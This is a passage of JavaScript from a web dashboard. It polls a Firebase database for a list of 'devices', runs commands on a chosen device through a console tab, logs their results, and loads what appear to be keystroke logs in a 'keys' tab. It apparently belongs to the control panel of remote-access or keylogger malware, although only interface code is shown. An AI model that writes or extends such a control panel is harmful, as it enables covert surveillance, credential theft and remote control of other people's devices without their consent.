function noteDev(){const n=prompt("note",localStorage.getItem("note_"+cur)||"");if(n===null)return;n?localStorage.setItem("note_"+cur,n):localStorage.removeItem("note_"+cur);renderHead()}

/* ---------- results ---------- */
function renderRes(){
  const f=$("#rf").value;
  $("#reslog").innerHTML=results.filter(r=>f==="all"||(f==="ok"?r.ok:!r.ok))
    .map(r=>`<div class="r ${r.ok?"ok":"bad"}" data-t="${r.t}"><div class="h"><span>${new Date(r.ts).toLocaleTimeString()}</span><span>${esc(r.label)}</span></div><div class="c">${esc(str(r.out)).slice(0,900)}</div></div>`)
    .join("")||'<div class="hint">no results yet</div>';
  $$("#reslog .r").forEach(el=>el.onclick=()=>el.classList.toggle("open"));
}

/* ---------- shell ---------- */
function togglePause(){paused=!paused;$("#pausebtn").textContent=paused?"resume":"pause";$("#pausebtn").classList.toggle("pri",paused)}
$$(".chip").forEach(c=>c.onclick=()=>{$$(".chip").forEach(x=>x.classList.remove("on"));c.classList.add("on");filter=c.dataset.f;renderRail()});
$("#search").oninput=e=>{q=e.target.value.toLowerCase();renderRail()};

document.addEventListener("keydown",e=>{
  if(e.ctrlKey&&e.key==="k"){e.preventDefault();$("#search").focus()}
  if(e.ctrlKey&&e.key==="Enter"){const t=activeTab();if(t==="console")runCmd()}
  if(e.key==="Escape")closeModal()
});

async function tick(){
  if(paused)return;
  devs=await get("devices")||{};
  renderRail();
  if(cur){renderHead();if(activeTab()==="keys")loadKl()}
}
async function boot(){
  if(!FB||!FB.startsWith("http")){FB=prompt("Firebase RTDB URL",FBDEF)||FBDEF;localStorage.setItem("fb",FB)}
  await tick();
  setInterval(tick,5000);
  const last=localStorage.getItem("last");
  if(last&&devs[last])open(last);
}
boot();
</script>
